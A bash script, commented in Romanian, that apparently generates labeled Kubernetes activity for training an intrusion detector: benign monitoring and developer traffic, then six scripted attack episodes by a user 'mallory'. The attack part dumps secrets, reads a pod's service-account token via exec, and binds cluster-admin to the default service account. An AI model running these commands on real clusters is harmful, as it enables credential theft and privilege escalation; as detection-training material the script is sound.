#!/bin/bash
# Colectare v2 — date mai multe și mai diverse pentru fine-tuning.
#   alice   (view) -> monitorizare benignă (read/list/get/describe)
#   dev     (edit) -> developer benign (deploy/scale/logs/EXEC propriu/patch)  <-- exec/create BENIGN
#   mallory (admin)-> ATAC, 6 episoade (recon -> secrete -> exec -> escaladare)
set -uo pipefail
W=/tmp/ids_collect
KA="kubectl --kubeconfig $W/kubeconfig-alice"
KD="kubectl --kubeconfig $W/kubeconfig-dev"
KM="kubectl --kubeconfig $W/kubeconfig-mallory"
WIN=$W/windows.txt; : > "$WIN"
echo "BENIGN_START=$(date -u +%Y-%m-%dT%H:%M:%SZ)" | tee -a "$WIN"

echo ">> BENIGN alice (monitorizare)"
KSPOD="$($KA get pods -n kube-system -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || true)"
for r in $(seq 1 20); do
  $KA get pods -A >/dev/null 2>&1;        $KA get services -A >/dev/null 2>&1
  $KA get deployments -A >/dev/null 2>&1; $KA get nodes >/dev/null 2>&1
  $KA get configmaps -A >/dev/null 2>&1;  $KA get namespaces >/dev/null 2>&1
  $KA get events -A >/dev/null 2>&1;      $KA get replicasets -A >/dev/null 2>&1
  $KA get endpoints -A >/dev/null 2>&1
  [ -n "$KSPOD" ] && $KA get pod "$KSPOD" -n kube-system >/dev/null 2>&1
  [ -n "$KSPOD" ] && $KA logs "$KSPOD" -n kube-system --tail=1 >/dev/null 2>&1
done
echo "   alice gata"

echo ">> BENIGN dev (developer: deploy/scale/logs/exec propriu)"
$KD create namespace devapp >/dev/null 2>&1 || true
for r in $(seq 1 12); do
  $KD create deployment web$r --image=nginx -n devapp >/dev/null 2>&1
  $KD scale deployment web$r --replicas=2 -n devapp >/dev/null 2>&1
  $KD get pods -n devapp >/dev/null 2>&1
  $KD get deployments -n devapp >/dev/null 2>&1
  $KD patch deployment web$r -n devapp -p "{\"metadata\":{\"labels\":{\"v\":\"$r\"}}}" >/dev/null 2>&1
  pod="$($KD get pods -n devapp -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || true)"
  if [ -n "$pod" ]; then
    $KD logs "$pod" -n devapp --tail=1 >/dev/null 2>&1
    $KD exec "$pod" -n devapp -- echo ok >/dev/null 2>&1     # EXEC benign (debugging propriu)
  fi
done
echo "   dev gata"
echo "BENIGN_END=$(date -u +%Y-%m-%dT%H:%M:%SZ)" | tee -a "$WIN"

echo ">> ATAC mallory (6 episoade)"
echo "ATTACK_START=$(date -u +%Y-%m-%dT%H:%M:%SZ)" | tee -a "$WIN"
for ep in $(seq 1 6); do
  # recon
  $KM get secrets -A >/dev/null 2>&1;      $KM get serviceaccounts -A >/dev/null 2>&1
  $KM get clusterroles >/dev/null 2>&1;    $KM get clusterrolebindings >/dev/null 2>&1
  $KM get roles -A >/dev/null 2>&1;        $KM get rolebindings -A >/dev/null 2>&1
  $KM get pods -A -o wide >/dev/null 2>&1
  # credential access
  for s in $($KM get secrets -A -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}{"\n"}{end}' 2>/dev/null | head -8); do
    ns="${s%/*}"; nm="${s#*/}"; $KM get secret "$nm" -n "$ns" -o yaml >/dev/null 2>&1
  done
  # lateral movement (exec ostil)
  $KM run pwn$ep --image=busybox --restart=Never -- sleep 3600 >/dev/null 2>&1
  $KM wait --for=condition=Ready pod/pwn$ep --timeout=30s >/dev/null 2>&1 || sleep 4
  $KM exec pwn$ep -- id >/dev/null 2>&1
  $KM exec pwn$ep -- cat /var/run/secrets/kubernetes.io/serviceaccount/token >/dev/null 2>&1
  # escaladare / persistență
  $KM create clusterrolebinding pwn$ep --clusterrole=cluster-admin --serviceaccount=default:default >/dev/null 2>&1
  echo "   episod atac $ep gata"
done
echo "ATTACK_END=$(date -u +%Y-%m-%dT%H:%M:%SZ)" | tee -a "$WIN"

echo ">> curățenie artefacte"
for ep in $(seq 1 6); do
  $KM delete pod pwn$ep --force --grace-period=0 >/dev/null 2>&1 || true
  $KM delete clusterrolebinding pwn$ep >/dev/null 2>&1 || true
done
$KD delete namespace devapp >/dev/null 2>&1 || true
echo "GATA colectare v2. Ferestre:"; grep -E "_START|_END" "$WIN"
